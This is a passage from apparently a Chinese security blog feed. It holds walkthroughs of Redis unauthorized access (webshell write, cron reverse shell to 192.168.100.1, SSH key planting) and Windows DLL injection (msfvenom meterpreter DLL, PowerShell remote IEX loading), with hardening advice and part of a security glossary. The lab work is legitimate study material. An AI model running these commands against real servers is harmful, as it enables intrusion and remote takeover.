alt></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png" alt></li><li>版本太低。。。</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png" alt></li><li>下载exe版：<a href="https://raw.githubusercontent.com/caoxinyu/RedisClient/windows/release/redisclient-win32.x86.2.0.exe" target="_blank" rel="noopener">redisclient-win32.x86.2.0.exe</a></li><li>无密码登录成功</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png" alt></li></ol><h3 id="0x15-redis服务器部署网站"><a href="#0x15-redis服务器部署网站" class="headerlink" title="0x15 redis服务器部署网站"></a>0x15 redis服务器部署网站</h3><ol><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/13.png" alt></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/14.png" alt></li></ol><h3 id="0x16-未授权测试——写入shell"><a href="#0x16-未授权测试——写入shell" class="headerlink" title="0x16 未授权测试——写入shell"></a>0x16 未授权测试——写入shell</h3><ol><li>前面是前提，登录后，写入shell</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png" alt></li><li>config set dir /var/www/html</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/15.png" alt></li><li>config set dbfilename shell.php</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/16.png" alt></li><li>set webshell “&lt;?php phpinfo()?&gt;” </li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/17.png" alt></li><li>save</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/18.png" alt></li><li>成功写入，访问验证</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/19.png" alt></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/20.png" alt></li></ol><h3 id="0x17-未授权测试——反弹shell"><a href="#0x17-未授权测试——反弹shell" class="headerlink" title="0x17 未授权测试——反弹shell"></a>0x17 未授权测试——反弹shell</h3><ol><li>启动端口监听</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/22.png" alt></li><li>config set dir /var/spool/cron</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/21.png" alt></li><li>set test “\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.1/8888 0&gt;&amp;1\n”</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/23.png" alt></li><li>config set dbfilename root</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/24.png" alt></li><li>save</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/25.png" alt></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/26.png" alt></li><li>成功反弹shell</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/27.png" alt></li></ol><h3 id="0x18-nmap扫描redis"><a href="#0x18-nmap扫描redis" class="headerlink" title="0x18 nmap扫描redis"></a>0x18 nmap扫描redis</h3><ol><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/28.png" alt></li></ol><h3 id="0x19-redis写入公钥免密登录"><a href="#0x19-redis写入公钥免密登录" class="headerlink" title="0x19 redis写入公钥免密登录"></a>0x19 redis写入公钥免密登录</h3><ol><li>cd ~/.ssh/</li><li>ssh-keygen -t rsa</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/29.png" alt></li><li>set test “\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDct/BllGmDdk/zqRJV5/ES5MgfhtmoMoZP/1Y7WgETGxMWRGxnTll8VQeOhFNbfwTPof98jxKUUc8rBU5+zgZl517LNlyGK14ifwVIO3Q6tJTm+rrZHUqn/4b1JX/rzUcjq2kcWr4VyRttSeHibim2Tj0S/7Y3Jyn5tKi4F2J3X9WdVk0CwPV8fyLUAg/rSed0z/IdeDKMuzetjUWZBtgmBGbP2NW+P7nHS+g4cEEr5Hebf2rnUQtd/oBIfnfajsZKWpQOux7c1YF2L6uFd0J6ShXwHyznrOuz8bNsdyEZY/xPIpw84+E28VEJFttiPeuE+/uYakFUj0YejZNxb3kB+FaItJ09Fx8JTfJOJroa4Dv44frXMzTR0coSnQS5lPfxmM3An8xGuFL4qtMtRqdVXbpNJ5RycAKLnoiObMi3TiuHwwdzpOSUiXFooES89v/29gHdC7T3X5aO88/lAUVtBy6drwtkXtJ3q3ECNjuvcwrmwSmHnRHlyTXV58rWps= root@kali\n\n\n”</li><li>config set dir /root/.ssh/</li><li>config set dbfilename authorized_keys</li><li>save</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/30.png" alt></li><li>利用公钥免密登录ssh</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/31.png" alt></li></ol><h3 id="0x1A-安全加固"><a href="#0x1A-安全加固" class="headerlink" title="0x1A 安全加固"></a>0x1A 安全加固</h3><ol><li>redis默认监听127.0.0.1</li><li>修改redis.conf，去掉#bind 127.0.0.1前的#，指定允许访问的IP</li><li><ul><li>bind 192.168.100.1 127.0.0.1 #保存，重启才能生效</li></ul></li><li>设置防火墙策略，仅允许指定IP来访问redis服务</li><li><ul><li>iptables -A INPUT -s x.x.x.x -p tcp –dport 6379 -j ACCEPT</li></ul></li><li>设置密码验证，修改redis.conf，去掉#requirepass前的#，后面加上密码</li><li><ul><li>requirepass WUFer123ex894tr&gt;&lt;)(*&amp;^   #保存，重启才能生效</li></ul></li><li>设置运行权限最小化</li><li><ul><li>useradd -M -s /sbin/nologin [username] #重启才能生效</li></ul></li><li>隐藏或禁用重要命令 #重启才能生效</li><li><ul><li>rename-command CONFIG “”</li></ul></li><li><ul><li>rename-command flushall “”</li></ul></li><li><ul><li>rename-command flushdb “”</li></ul></li><li><ul><li>rename-command shutdown shotdown_test</li></ul></li><li>关注官网发布，及时更新程序或补丁</li></ol><h3 id="0x1B-相关参考"><a href="#0x1B-相关参考" class="headerlink" title="0x1B 相关参考"></a>0x1B 相关参考</h3><ol><li><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">redis教程</a></li><li><a href="https://help.aliyun.com/knowledge_detail/37447.html" target="_blank" rel="noopener">redis安全加固</a></li></ol><h2 id="0x20-MongoDB"><a href="#0x20-MongoDB" class="headerlink" title="0x20 MongoDB"></a>0x20 MongoDB</h2><h3 id="0x21-简介"><a href="#0x21-简介" class="headerlink" title="0x21 简介"></a>0x21 简介</h3><ol><li>MongoDB服务安装后，默认未配置访问认证授权，无需认证即可连接数据库，对数据库进行任意操作。</li><li>3.0之前，默认监听0.0.0.0；3.0之后，默认监听127.0.0.1</li><li>3.0之前，如果未添加用户管理账号及数据库账号，使用–auth参数启动时，本地无需账号密码即可访问数据库，远程则需认证；3.0之后，使用–auth参数启动时，无账号则本地或远程都无任何数据库访问权限。</li></ol><h3 id="0x22-环境与未授权无密码连接"><a href="#0x22-环境与未授权无密码连接" class="headerlink" title="0x22 环境与未授权无密码连接"></a>0x22 环境与未授权无密码连接</h3><ol><li><a href="https://www.mongodb.com/download-center/community?jmp=docs" target="_blank" rel="noopener">下载MongoDB</a></li><li><a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/" target="_blank" rel="noopener">windows server 2008 R2 x64安装MongoDB</a></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/32.png" alt></li><li>使用navicat连接mongodb</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/33.png" alt></li><li>使用nosqlbooster连接mongodb</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/34.png" alt></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/35.png" alt></li></ol><h3 id="0x23-mongodb相关命令"><a href="#0x23-mongodb相关命令" class="headerlink" title="0x23 mongodb相关命令"></a>0x23 mongodb相关命令</h3><ol><li>help #帮助信息</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/36.png" alt></li><li>show dbs #列出所有数据库</li><li>use admin #选择数据库admin，一般存在数据库admin</li><li>show users #列出用户信息</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/37.png" alt></li></ol><h3 id="0x24-nmap简单扫描"><a href="#0x24-nmap简单扫描" class="headerlink" title="0x24 nmap简单扫描"></a>0x24 nmap简单扫描</h3><ol><li>nmap -p 27017 192.168.100.3</li></ol><h3 id="0x25-安全加固"><a href="#0x25-安全加固" class="headerlink" title="0x25 安全加固"></a>0x25 安全加固</h3><ol><li>防火墙等安全设备限制IP范围，如果无需远程访问，则只限制本地IP，建议只限制本地IP，修改配置文件mongod.cfg，bindIp: 127.0.0.1</li><li>修改默认端口为其他端口</li><li>设置用户密码登录认证，设置非常用账号与强密码<pre><code>&gt; use adminswitched to db admin&gt; db.createUser(... {... user:&quot;tttesttt&quot;,... pwd:&quot;T35ttesttt&quot;,... roles:[{role:&quot;userAdminAnyDatabase&quot;,db:&quot;admin&quot;}]... }... )</code></pre></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/38.png" alt></li><li>重启mongodb服务，开启访问认证：启动时添加–auth参数</li><li>修改配置文件mongod.cfg，添加<pre><code>#security:security:authorization: enabled</code></pre></li><li>指定配置文件启动MongoDB：$mongod –config /etc/mongod.conf</li></ol><h3 id="0x24-相关参考"><a href="#0x24-相关参考" class="headerlink" title="0x24 相关参考"></a>0x24 相关参考</h3><ol><li><a href="https://blog.csdn.net/weixin_43868754/article/details/104599352" target="_blank" rel="noopener">安装MongoDB</a></li><li><a href="https://docs.mongodb.com/manual/reference/built-in-roles/" target="_blank" rel="noopener">mongodb内置角色</a></li></ol><h2 id="0x30-Jenkins"><a href="#0x30-Jenkins" class="headerlink" title="0x30 Jenkins"></a>0x30 Jenkins</h2><h3 id="0x31-简介"><a href="#0x31-简介" class="headerlink" title="0x31 简介"></a>0x31 简介</h3><ol><li>Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</li></ol><h3 id="0x32-环境"><a href="#0x32-环境" class="headerlink" title="0x32 环境"></a>0x32 环境</h3><ol><li><a href="http://mirrors.jenkins.io/" target="_blank" rel="noopener">下载地址</a></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></li><li><a href="https://www.freebuf.com/vuls/212799.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/212799.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之windows-DLL注入</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-DLL注入"><a href="#0x00-DLL注入" class="headerlink" title="0x00 DLL注入"></a>0x00 DLL注入</h2><ol><li>所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。要实现DLL注入，首先需要打开目标进程。</li><li>环境：kali</li><li>靶场：windows server 2008 x64</li></ol><h2 id="0x01-生成DLL文件"><a href="#0x01-生成DLL文件" class="headerlink" title="0x01 生成DLL文件"></a>0x01 生成DLL文件</h2><ol><li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f dll&gt;test.dll</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/1.png" alt></li></ol><h2 id="0x02-启动msfconsole开启监听"><a href="#0x02-启动msfconsole开启监听" class="headerlink" title="0x02 启动msfconsole开启监听"></a>0x02 启动msfconsole开启监听</h2><ol><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/2.png" alt></li></ol><h2 id="0x10-DLL注入进程"><a href="#0x10-DLL注入进程" class="headerlink" title="0x10 DLL注入进程"></a>0x10 DLL注入进程</h2><h3 id="0x11-OpenArk工具注入"><a href="#0x11-OpenArk工具注入" class="headerlink" title="0x11 OpenArk工具注入"></a>0x11 OpenArk工具注入</h3><ol><li><a href="https://github.com/BlackINT3/OpenArk/releases" target="_blank" rel="noopener">OpenArk</a></li><li>启动32位、64位记事本</li><li>C:\Windows\System32\notepad.exe</li><li>C:\Windows\SysWOW64\notepad.exe</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/3.png" alt></li><li>右击64位记事本进程——注入DLL——选择生成的DLL文件</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/4.png" alt></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/5.png" alt></li><li>成功反弹shell</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/6.png" alt></li></ol><h3 id="0x12-remotedllinjector脚本注入"><a href="#0x12-remotedllinjector脚本注入" class="headerlink" title="0x12 remotedllinjector脚本注入"></a>0x12 remotedllinjector脚本注入</h3><ol><li><a href="https://securityxploded.com/download-software.php?name=remotedllinjector" target="_blank" rel="noopener">remotedllinjector</a></li><li>同样启动32位、64位记事本</li><li>开启任务管理器查看进程PID</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/7.png" alt></li><li>RemoteDLLInjector64.exe 3968 C:\Temp\test.dll</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/8.png" alt></li><li>成功反弹shell</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/9.png" alt></li></ol><h3 id="0x13-metasploit注入"><a href="#0x13-metasploit注入" class="headerlink" title="0x13 metasploit注入"></a>0x13 metasploit注入</h3><h3 id="0x14-powersploit注入"><a href="#0x14-powersploit注入" class="headerlink" title="0x14 powersploit注入"></a>0x14 powersploit注入</h3><ol><li>Python2搭建简易服务器：Python -m SimpleHTTPServer 8888</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/13.png" alt></li><li>靶机可以访问</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/14.png" alt></li><li>powershell远程加载Invoke-DllInjection.ps1脚本</li><li>IEX(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/CodeExecution/Invoke-DllInjection.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/CodeExecution/Invoke-DllInjection.ps1&quot;</a>)</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/15.png" alt></li><li>执行DLL注入：Invoke-DllInjection -ProcessID 3888 -Dll C:\Temp\test.dll</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/16.png" alt></li><li>开启msfconsole监听端口，并反弹成功</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/12.png" alt></li></ol><h2 id="0x20-简单提权"><a href="#0x20-简单提权" class="headerlink" title="0x20 简单提权"></a>0x20 简单提权</h2><ol><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/11.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 提权 </tag>
            
            <tag> DLL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全百科</title>
      <link href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"/>
      <url>/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-信息安全术语"><a href="#0x00-信息安全术语" class="headerlink" title="0x00 信息安全术语"></a>0x00 信息安全术语</h2><h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a><strong>肉鸡</strong></h3><p>&ensp;&ensp;&ensp;&ensp;肉鸡也称傀儡机，是指可以被黑客远程控制的机器。比如用”灰鸽子”等诱导客户点击或者电脑被黑客攻破或用户电脑有漏洞被种植了木马，黑客可以随意操纵它并利用它做任何事情。<br>&ensp;&ensp;&ensp;&ensp;肉鸡通常被用作DDOS攻击。可以是各种系统，如windows、linux、unix等，更可以是一家公司、企业、学校甚至是政府军队的服务器。</p><h3 id="木马病毒-Trojan-virus"><a href="#木马病毒-Trojan-virus" class="headerlink" title="木马病毒 Trojan virus"></a><strong>木马病毒 Trojan virus</strong></h3><p>&ensp;&ensp;&ensp;&ensp;木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。木马病毒其实是计算机黑客用于远程控制计算机的程序，将控制程序寄生于被控制的计算机系统中，里应外合，对被感染木马病毒的计算机实施操作。一般的木马病毒程序主要是寻找计算机后门，伺机窃取被控计算机中的密码和重要文件等。可以对被控计算机实施监控、资料修改等非法操作。木马病毒具有很强的隐蔽性，可以根据黑客意图突然发起攻击。</p><h3 id="网页木马-Web-Trojan"><a href="#网页木马-Web-Trojan" class="headerlink" title="网页木马 Web Trojan"></a><strong>网页木马 Web Trojan</strong></h3><p>&ensp;&ensp;&ensp;&ensp;网页木马就是表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。</p><h3 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a><strong>挂马</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所谓的挂马，就是黑客通过各种手段，包括SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day, 等各种方法获得网站管理员账号，然后登陆网站后台，通过数据库“备份/恢复”或者上传漏洞获得一个webshell。利用获得的webshell修改网站页面的内容，向页面中加入恶意转向代码。也可以直接通过弱口令获得服务器或者网站FTP，然后直接对网站页面直接进行修改。当你访问被加入恶意代码的页面时，你就会自动的访问被转向的地址或者下载木马病毒。</p><h3 id="后门-back-door"><a href="#后门-back-door" class="headerlink" title="后门 back door"></a><strong>后门 back door</strong></h3><p>&ensp;&ensp;&ensp;&ensp;后门，本意是指一座建筑背面开设的门，通常比较隐蔽，为进出建筑的人提供方便和隐蔽。在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</p><h3 id="物联网-IOT：Internet-of-Things"><a href="#物联网-IOT：Internet-of-Things" class="headerlink" title="物联网 IOT：Internet of Things"></a><strong>物联网 IOT：Internet of Things</strong></h3><p>&ensp;&ensp;&ensp;&ensp;物联网（The Internet of Things，简称IOT）是指通过 各种信息传感器、射频识别技术、全球定位系统、红外感应器、激光扫描器等各种装置与技术，实时采集任何需要监控、 连接、互动的物体或过程，采集其声、光、热、电、力学、化 学、生物、位置等各种需要的信息，通过各类可能的网络接入，实现物与物、物与人的泛在连接，实现对物品和过程的智能化感知、识别和管理。物联网是一个基于互联网、传统电信网等的信息承载体，它让所有能够被独立寻址的普通物理对象形成互联互通的网络。</p><h3 id="云计算-cloud-computing"><a href="#云计算-cloud-computing" class="headerlink" title="云计算 cloud computing"></a><strong>云计算 cloud computing</strong></h3><p>&ensp;&ensp;&ensp;&ensp;云计算（cloud computing）是分布式计算的一种，指的是通过网络“云”将巨大的数据计算处理程序分解成无数个小程序，然后，通过多部服务器组成的系统进行处理和分析这些小程序得到结果并返回给用户。云计算早期，简单地说，就是简单的分布式计算，解决任务分发，并进行计算结果的合并。因而，云计算又称为网格计算。通过这项技术，可以在很短的时间内（几秒种）完成对数以万计的数据的处理，从而达到强大的网络服务。<br>&ensp;&ensp;&ensp;&ensp;现阶段所说的云服务已经不单单是一种分布式计算，而是分布式计算、效用计算、负载均衡、并行计算、网络存储、热备份冗杂和虚拟化等计算机技术混合演进并跃升的结果。</p><h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a><strong>rootkit</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</p><h3 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a><strong>ipc$</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指空连接，使用命令 net use url=file://\IP\ipc$\IP\ipc$ “” /user:”” 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><strong>弱口令</strong></h3><p>&ensp;&ensp;&ensp;&ensp;弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。</p><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a><strong>shell</strong></h3><p>&ensp;&ensp;&ensp;&ensp;在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><strong>webshell</strong></h3><p>&ensp;&ensp;&ensp;&ensp;webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><strong>溢出</strong></h3><p>&ensp;&ensp;&ensp;&ensp;溢出是黑客利用操作系统的漏洞，专门开发了一种程序，加相应的参数运行后，就可以得到你电脑具有管理员资格的控制权，你在你自己电脑上能够运行的东西他可以全部做到，等于你的电脑就是他的了。溢出是程序设计者设计时的不足所带来的错误。</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a><strong>注入</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所谓的SQL（结构化查询语言）注入，简单来说就是利用SQL语句在外部对SQL数据库进行查询，更新等动作。首先，数据库作为一个网站最重要的组件之一（如果这个网站有数据库的话），里面是储存着各种各样的内容，包括管理员的账号密码</p><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a><strong>内网</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指局域网，局域网的覆盖范围一般是方圆几千米之内，其具备的安装便捷、成本节约、扩展方便等特点使其在各类办公室内运用广泛。局域网可以实现文件管理、应用软件共享、打印机共享等功能，在使用过程当中，通过维护局域网网络安全，能够有效地保护资料安全，保证局域网网络能够正常稳定的运行。</p><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a><strong>外网</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指广域网，广域网（英语：Wide Area Network，缩写为 WAN），又称广域网、外网、公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a><strong>端口</strong></h3><p>&ensp;&ensp;&ensp;&ensp;”端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11插口也属于物理端口的范畴。</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a><strong>免杀</strong></h3><p>&ensp;&ensp;&ensp;&ensp;免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a><strong>加壳</strong></h3><p>&ensp;&ensp;&ensp;&ensp;加壳的另一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，之后再把控制权交还给原始代码，这样做的目的是隐藏程序真正的OEP（入口点，防止被破解）。大多数病毒就是基于此原理。<br>&ensp;&ensp;&ensp;&ensp;加壳的程序需要阻止外部程序或软件对加壳程序本身的反汇编分析或者动态分析，以达到保护壳内原始程序以及软件不被外部程序破坏，保证原始程序正常运行。<br>&ensp;&ensp;&ensp;&ensp;这种技术也常用来保护软件版权，防止软件被破解。但对于病毒，加壳可以绕过一些杀毒软件的扫描，从而实现它作为病毒的一些入侵或破坏的一些特性。</p><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a><strong>花指令</strong></h3><p>&ensp;&ensp;&ensp;&ensp;花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等</p><h3 id="域名系统器-DNS-Domain-Name-System"><a href="#域名系统器-DNS-Domain-Name-System" class="headerlink" title="域名系统器 DNS Domain Name System"></a><strong>域名系统器 DNS Domain Name System</strong></h3><p>&ensp;&ensp;&ensp;&ensp;DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a><strong>脚本</strong></h3><p>&ensp;&ensp;&ensp;&ensp;脚本（Script）是一种批处理文件的延伸，是一种纯文本保存的程序，一般来说的计算机脚本程序是确定的一系列控制计算机进行运算操作动作的组合，在其中可以实现一定的逻辑分支等。</p><h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a><strong>转义字符</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”&quot;来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a><strong>CDN</strong></h3><p>&ensp;&ensp;&ensp;&ensp;CDN的全称是Content Delivery 